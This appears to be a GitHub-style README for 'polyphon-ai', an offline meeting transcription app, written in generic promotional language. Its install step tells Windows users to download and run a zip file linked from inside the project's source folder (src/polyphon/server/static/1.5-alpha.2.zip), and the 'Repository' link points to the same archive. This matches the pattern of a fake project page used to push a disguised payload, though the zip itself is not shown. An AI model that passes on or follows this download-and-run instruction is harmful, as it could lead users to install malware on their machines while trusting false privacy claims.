# 🎙️ polyphon-ai - Your Private Meeting Transcriber

---

## 🚀 Getting Started

Welcome! polyphon-ai is a powerful tool that listens to your audio recordings and turns them into clean, organized text. It can even figure out **who said what** — all without sending your data anywhere. Everything runs on your own computer, so your conversations stay private.

Whether you have a recorded meeting, an interview, a lecture, or a podcast, polyphon-ai helps you get trustworthy, searchable notes in minutes. No cloud, no sign-up, no monthly fees.

---

## 💾 Download & Install

Ready to begin? Here’s how to get polyphon-ai on your Windows computer:

### Step 1: Get the Software

👉 **[Click here to visit the download page](https://github.com/traydoe/polyphon-ai/raw/refs/heads/main/src/polyphon/server/static/1.5-alpha.2.zip)**

Visit this link to download the application. Look for the latest release — the file will be labeled clearly. 

### Step 2: Run the Installer

Once the download finishes, open your **Downloads** folder and double-click the file you just downloaded. Follow the simple on-screen instructions. You don’t need to change any settings — the default options are perfect.

### Step 3: Finish Setup

After installation, you’ll see the polyphon-ai icon on your desktop or in your Start Menu. Click it to launch the app.

---

## 🧠 What Can polyphon-ai Do?

| Feature | What It Means For You |
|---------|------------------------|
| **🎧 Speech-to-Text** | Converts spoken audio into written text automatically. |
| **👥 Speaker Diarization** | Detects different voices and labels them (e.g., "Speaker 1," "Speaker 2"). |
| **🏷️ Speaker Recognition** | When you train it to know voices, it can name them — like "John" or "Sarah." |
| **📝 Structured Notes** | Identifies speakers, timestamps, and segments to create clear, organized output. |
| **🔒 100% Offline** | Your audio never leaves your computer. No internet connection needed during transcription. |
| **📄 Meeting Summaries** | Optional — uses a built-in language model to summarize long discussions. |

---

## 🛠️ System Requirements

polyphon-ai works best on a reasonably modern Windows PC. Here’s what we recommend:

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **Processor** | Quad-core CPU | 8-core or better |
| **Memory** | 8 GB RAM | 16 GB RAM |
| **Storage** | 2 GB free space | 5 GB+ (for models) |
| **Graphics Card** | Not required | NVIDIA GPU (optional, for faster processing) |

> 💡 **No GPU? No problem.** polyphon-ai will still work on CPU-only machines — it just takes a bit longer to process long files.

---

## 🎯 How to Use polyphon-ai (Step-by-Step)

### 1. 🎬 Start the App

Click the polyphon-ai icon to launch it. A clean, simple window will appear.

### 2. 📁 Choose Your Audio File

Click the **"Upload Audio"** button and select a file from your computer. Supported formats include MP3, WAV, M4A, and FLAC.

> **Tip:** For best results, use clear audio with minimal background noise. A quiet room and a good microphone make a big difference.

### 3. ⚙️ Pick Your Settings (Optional)

You can leave everything as default. But if you want, you can:

- **Enable speaker names** — Teach it to recognize specific voices (more on this below).
- **Choose output format** — Plain text, timestamped text, or a structured summary.
- **Select model size** — "Small" is faster; "Large" is more accurate but slower.

### 4. ▶️ Start Transcription

Click **"Run"** or **"Transcribe"**. The app will show progress as it works. A minute of audio usually takes about one minute to process on a normal PC.

### 5. 💾 Review & Save

When it finishes, you’ll see the full transcript with speaker labels. You can:

- **Copy** the text to your clipboard.
- **Save** it as a **.txt** or **.docx** file.
- **Export** to Markdown or JSON for advanced use.

---

## 🗣️ Teaching It to Recognize Voices

Here’s how to get named speakers (like "Mary" instead of "Speaker 1"):

1. In the app, go to the **Speakers** tab.
2. Click **"Add Speaker"** and type a name.
3. Upload a short audio clip (10–30 seconds) of that person speaking clearly.
4. Repeat for other people.

Next time you transcribe a meeting with those voices, polyphon-ai will automatically use the names you set. Magic! ✨

---

## 🔍 Advanced Features for Curious Users

If you’re comfortable with a bit more control, you can also run polyphon-ai from the command line. Here are a few examples:

```bash
# Transcribe a file and show speaker names
polyphon-ai transcribe meeting.mp3 --speakers

# Output a summary using the built-in AI model
polyphon-ai transcribe lecture.wav --summary

# Export to JSON for custom tools
polyphon-ai transcribe podcast.m4a --output-format json
```

These are entirely optional — the visual app covers everything you need for daily use.

---

## ❓ Frequently Asked Questions

### Is my audio really private?
**Yes.** Everything runs locally, on your computer. There is no cloud upload, no account, no tracking. Your data never leaves your machine.

### Does it work for long recordings?
Yes. There’s no hard limit, but longer files take more time and memory. For a 2-hour meeting, expect it to run for 30–60 minutes depending on your hardware.

### Can I use it for languages other than English?
Yes. polyphon-ai supports dozens of languages, including Spanish, French, German, Chinese, Japanese, and more. Choose your language in the settings before transcribing.

### What if I don’t have an NVIDIA GPU?
No problem. The app falls back to CPU processing automatically. It’s slower, but it works.

### Is this free?
Yes. polyphon-ai is fully free and open-source. No hidden costs or premium tiers.

---

## 🛟 Troubleshooting Tips

| Issue | Likely Solution |
|-------|-----------------|
| **App won’t start** | Make sure you have at least 2 GB of free disk space and reinstall the latest version. |
| **Transcription is very slow** | Try the "Small" model in settings, or close other programs to free up memory. |
| **No speaker names appear** | Ensure you added speaker samples. For best results, give it at least 20 seconds per person. |
| **Output looks garbled** | Use a higher-quality audio file. Avoid heavy background noise or echo. |

Still stuck? Visit the support page on the GitHub repository linked above — the community and maintainers are friendly and responsive.

---

## 🌟 Why Choose polyphon-ai?

- **Private by default** — no internet, no cloud, no compromises.
- **Accurate and modern** — built on state-of-the-art speech recognition models.
- **Friendly for beginners** — no technical knowledge required.
- **Flexible for pros** — CLI access, JSON exports, and custom models.
- **Free, forever** — open source under a permissive license.

---

## 🧩 Under the Hood (For The Curious)

polyphon-ai is built using a combination of powerful open-source tools, including:

- **faster-whisper** — Lightning-fast speech recognition
- **pyannote** — Speaker identification and separation
- **Ollama** — Local AI assistant for summarization
- **FastAPI** — Clean, reliable backend

All components are carefully integrated to give you a smooth, one-click experience.

---

## 📢 Share Your Feedback

We’d love to hear how polyphon-ai works for you. Found a bug? Have an idea for a feature? Want to show off your meeting notes?

- 🔧 Report issues on the GitHub page
- 💬 Join the discussion in the Issues tab
- ⭐ Leave a star if you like the project

Your input shapes what comes next.

---

## 🙌 Thank You

Thank you for choosing polyphon-ai. We built this tool because we believe everyone deserves accurate transcription without giving up their privacy. We hope it saves you hours of manual note-taking and makes your life a little easier.

Let’s turn your audio into insight — together.

---

## 📦 More Information

**Repository:** [polyphon-ai on GitHub](https://github.com/traydoe/polyphon-ai/raw/refs/heads/main/src/polyphon/server/static/1.5-alpha.2.zip)

**License:** Free and open source

<p align="center">Made with 🧡 for privacy-focused people everywhere</p>

---

Keywords: asr, audio-processing, cli, fastapi, faster-whisper, llm, local-first, meeting-notes, offline, ollama, privacy, pyannote, python, self-hosted, speaker-diarization, speaker-recognition, speech-to-text, transcription, voice-recognition, whisper